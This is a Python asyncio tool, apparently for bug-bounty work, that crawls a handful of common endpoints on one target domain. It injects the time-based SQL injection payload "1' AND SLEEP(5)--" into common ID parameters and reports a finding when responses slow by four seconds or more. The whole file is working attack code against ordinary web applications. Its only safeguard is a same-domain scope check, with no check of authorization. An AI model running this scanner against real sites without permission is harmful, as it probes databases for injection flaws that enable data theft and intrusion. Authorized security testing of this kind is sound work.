import aiohttp
import asyncio
import time
from urllib.parse import urljoin, urlparse

COMMON_ENDPOINTS = [
    "/", "/api/user", "/api/profile", "/admin", "/dashboard"
]

COMMON_PARAMS = ["id", "user_id", "uid", "account"]


class SovereignBBEngine:
    def __init__(self, base_scope, concurrency=15):
        self.base_scope = self._normalize_scope(base_scope)
        self.base_domain = urlparse(self.base_scope).netloc
        self.semaphore = asyncio.Semaphore(concurrency)
        self.session = None

    # ---------- Scope Enforcement ----------

    def _normalize_scope(self, url):
        if not url.startswith(("http://", "https://")):
            raise ValueError("Scope must start with http:// or https://")
        return url.rstrip("/")

    def in_scope(self, url):
        p = urlparse(url)
        return (
            p.scheme in ("http", "https") and
            p.netloc == self.base_domain
        )

    # ---------- Main Pipeline ----------

    async def run(self):
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            self.session = session
            discoveries = await self.discover()
            results = []

            for finding in discoveries:
                confirmed, evidence = await self.validate(finding)
                if not confirmed:
                    continue

                finding["impact"] = "Time-Based SQL Injection"
                finding["evidence"] = evidence
                results.append(finding)

            return results

    async def discover(self):
        findings = []

        for ep in COMMON_ENDPOINTS:
            url = urljoin(self.base_scope + "/", ep)

            if not self.in_scope(url):
                continue

            async with self.semaphore:
                try:
                    async with self.session.get(url) as r:
                        if r.status in (200, 401, 403):
                            for p in COMMON_PARAMS:
                                findings.append({
                                    "url": url,
                                    "param": p
                                })
                except Exception:
                    pass

        return findings

    # ---------- Validation (High Precision) ----------

    async def validate(self, finding):
        baseline = await self._timed_request(
            finding["url"],
            {finding["param"]: "1"}
        )

        injected = await self._timed_request(
            finding["url"],
            {finding["param"]: "1' AND SLEEP(5)--"}
        )

        # Strong confirmation logic
        if baseline > 0 and injected - baseline >= 4:
            return True, {
                "baseline": round(baseline, 2),
                "injected": round(injected, 2)
            }

        return False, None

    async def _timed_request(self, url, params):
        start = time.time()
        try:
            async with self.session.get(url, params=params):
                pass
        except Exception:
            return 0
        return time.time() - start
